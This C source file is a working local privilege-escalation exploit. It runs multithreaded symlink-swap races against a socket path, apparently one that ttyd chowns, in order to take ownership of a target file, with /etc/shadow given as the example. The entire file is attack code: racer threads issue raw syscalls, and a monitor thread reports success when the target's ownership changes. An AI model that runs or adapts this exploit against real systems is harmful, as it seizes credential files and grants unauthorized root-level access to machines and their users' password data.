/*
 * Dirty Cow Style Multi-Threaded TOCTOU Racer
 * 
 * Inspired by CVE-2016-5195 and CVE-2017-18018 exploitation techniques.
 * Uses multiple threads continuously racing to swap symlinks.
 * 
 * Thread 1: Continuously unlinks and creates symlink to target
 * Thread 2: Same, racing against thread 1
 * Thread 3: Monitor for success
 * 
 * Compile: gcc -O3 -pthread -o dirtycow_racer dirtycow_racer.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>

static volatile int running = 1;
static volatile int wins = 0;
static volatile unsigned long attempts = 0;

static char socket_path[512];
static char target_file[256];
static char dummy_file[512];

void sighandler(int sig) { running = 0; }

/* Inline symlink syscall for speed */
static inline long fast_symlink(const char *t, const char *l) {
    long ret;
    __asm__ volatile("syscall" : "=a"(ret) : "0"(88), "D"(t), "S"(l) : "rcx","r11","memory");
    return ret;
}

/* Inline unlink syscall */
static inline long fast_unlink(const char *p) {
    long ret;
    __asm__ volatile("syscall" : "=a"(ret) : "0"(87), "D"(p) : "rcx","r11","memory");
    return ret;
}

/* Racer thread - continuously try to swap */
void *racer_thread(void *arg) {
    int id = *(int*)arg;
    printf("[Thread %d] Starting race loop\n", id);
    
    while (running) {
        /* Try to unlink whatever is there */
        fast_unlink(socket_path);
        
        /* Immediately create symlink to target */
        if (fast_symlink(target_file, socket_path) == 0) {
            __sync_fetch_and_add(&attempts, 1);
        }
        
        /* No sleep - maximum speed */
    }
    return NULL;
}

/* Monitor thread - checks if /etc/shadow ownership changed */
void *monitor_thread(void *arg) {
    struct stat st;
    struct stat orig_st;
    
    if (stat(target_file, &orig_st) < 0) {
        perror("stat target");
        return NULL;
    }
    
    printf("[Monitor] Original owner: uid=%d gid=%d\n", orig_st.st_uid, orig_st.st_gid);
    
    while (running) {
        if (stat(target_file, &st) == 0) {
            if (st.st_uid != orig_st.st_uid || st.st_gid != orig_st.st_gid) {
                printf("\n[MONITOR] !!! OWNERSHIP CHANGED !!!\n");
                printf("[MONITOR] New owner: uid=%d gid=%d\n", st.st_uid, st.st_gid);
                wins = 1;
                running = 0;
                break;
            }
        }
        usleep(10000);  /* Check every 10ms */
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <socket_path> <target_file> <num_threads>\n", argv[0]);
        fprintf(stderr, "Example: %s /opt/sockets/ttyd.sock /etc/shadow 4\n", argv[0]);
        return 1;
    }

    strncpy(socket_path, argv[1], sizeof(socket_path)-1);
    strncpy(target_file, argv[2], sizeof(target_file)-1);
    int num_threads = atoi(argv[3]);
    
    if (num_threads < 1 || num_threads > 16) {
        fprintf(stderr, "Threads must be 1-16\n");
        return 1;
    }

    signal(SIGINT, sighandler);
    signal(SIGTERM, sighandler);

    printf("[DIRTYCOW RACER] Socket: %s\n", socket_path);
    printf("[DIRTYCOW RACER] Target: %s\n", target_file);
    printf("[DIRTYCOW RACER] Threads: %d\n\n", num_threads);

    /* Start racer threads */
    pthread_t racers[16];
    int thread_ids[16];
    for (int i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
        pthread_create(&racers[i], NULL, racer_thread, &thread_ids[i]);
    }

    /* Start monitor thread */
    pthread_t monitor;
    pthread_create(&monitor, NULL, monitor_thread, NULL);

    printf("[MAIN] Racers started. Run ttyd now!\n");
    printf("[MAIN] Press Ctrl+C to stop\n\n");

    /* Wait for threads */
    for (int i = 0; i < num_threads; i++) {
        pthread_join(racers[i], NULL);
    }
    pthread_join(monitor, NULL);

    printf("\n[RESULTS]\n");
    printf("  Attempts: %lu\n", attempts);
    printf("  Success: %s\n", wins ? "YES!" : "No");

    return wins ? 0 : 1;
}
